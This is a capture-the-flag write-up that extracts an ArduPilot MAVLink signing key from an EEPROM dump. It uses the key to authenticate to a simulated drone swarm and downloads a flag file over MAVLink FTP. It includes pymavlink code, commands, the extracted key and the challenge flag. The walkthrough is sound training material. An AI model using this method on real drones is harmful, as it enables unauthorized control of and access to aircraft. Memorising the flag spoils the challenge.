# One to Rule Them All

| | |
|---|---|
| **Category** | Communication & RF |
| **Points** | 499 |
| **Solves** | 32 |

## Description

Prismantir's team got hands on an enemy drone last night — the rest of its swarm went dark before anyone else could be brought in. Its flight controller landed on your desk this morning, still warm. One unit is all we get but word is they all share the same secret, so make it count before someone finds out and changes it.

**Flag format:** `starpwn{[A-Za-z_]+}`

**Attachments:**
- `eeprom.bin` — ArduPilot EEPROM dump
- Web UI: `starpwn-27f0b78c7312-one-to-rule-them-all-0-0.chals.io`
- MAVLink Telemetry: `tcp:0.cloud.chals.io:26121`

## Solution

### Steps

**1. Identify the EEPROM format**

Confirm the dump is a valid ArduPilot AP_Param EEPROM by checking the magic bytes:

```bash
python3 analyse_eeprom.py eeprom.bin
```

Output:
```
Magic: PA
Revision byte: 6
Size: 16384 bytes
```

**2. Locate the MAVLink signing key**

Scan the EEPROM for the `SigningKey` structure magic `0x3852FCD1` defined in `GCS_Signing.cpp`:

```cpp
// From GCS_Signing.cpp
#define SIGNING_KEY_MAGIC 0x3852fcd1

struct SigningKey {
    uint32_t magic;
    uint64_t timestamp;
    uint8_t secret_key[32];
};
```

```bash
python3 analyse_signing.py eeprom.bin GCS_Signing.cpp
```

Output:
```
============================================================
Offset     : 0x1F80
Magic      : 0x3852FCD1
Timestamp  : 36527303400913
Key        : d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
============================================================
```

**3. Verify the signing key**

Confirm the extracted key is valid by receiving a signed MAVLink2 frame from the swarm and verifying the HMAC-SHA256 signature:

```bash
python3 verify_key.py 0.cloud.chals.io <port> d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
# → [+] KEY VERIFIED
```

**4. Authenticate to the swarm with MAVLink FTP**

Use the extracted key to authenticate via signed MAVLink2 and connect to the drone's filesystem over MAVLink FTP (FILE_TRANSFER_PROTOCOL, msg ID 110):

```python
import os
os.environ["MAVLINK20"] = "1"   # Required: forces MAVLink2 with signing
from pymavlink import mavutil

KEY = bytes.fromhex("d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126")
m = mavutil.mavlink_connection("tcp:0.cloud.chals.io:<port>", dialect="ardupilotmega",
                                source_system=255, source_component=190)
m.setup_signing(KEY, sign_outgoing=True, allow_unsigned_callback=lambda mav, mid: True)
```

**5. List the filesystem and download the flag**

Use the MAVLink FTP protocol to list the SITL working directory and download `DCIM/flag.jpg`:

```bash
python3 solve.py 0.cloud.chals.io <port>
# [*] listing '.'
# [*] listing 'DCIM'
#     F  flag.jpg  ...
# [*] downloading DCIM/flag.jpg
# [+] wrote flag.jpg
```

**6. Read the flag from the image**

The downloaded `flag.jpg` is an aerial photograph of Allegiant Stadium in Las Vegas with the message painted on the roof:

> *machines never pledged to be allegiant*

### Key Artifacts

| File | Description |
|------|-------------|
| `eeprom.bin` | ArduPilot EEPROM dump containing the signing key |
| `GCS_Signing.cpp` | ArduPilot source — defines `SigningKey` struct and magic |
| `analyse_eeprom.py` | Scans EEPROM for non-zero regions and signing magic |
| `analyse_signing.py` | Extracts signing key using struct layout from source |
| `verify_key.py` | Verifies key against a live signed MAVLink2 frame |
| `solve.py` | Full exploit: authenticate + MAVLink FTP download |
| `flag.jpg` | Downloaded flag image |

### Attack Summary

```
eeprom.bin (ArduPilot EEPROM dump)
    → scan for SIGNING_KEY_MAGIC (0x3852FCD1)
    → extract 32-byte secret_key at offset 0x1F90
    → key: d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
        → authenticate MAVLink2 (MAVLINK20=1 + setup_signing)
        → MAVLink FTP LIST "." → LIST "DCIM" → READ "DCIM/flag.jpg"
        → open image → read flag
```

## Flag

```
starpwn{machines_never_pledged_to_be_allegiant}
```
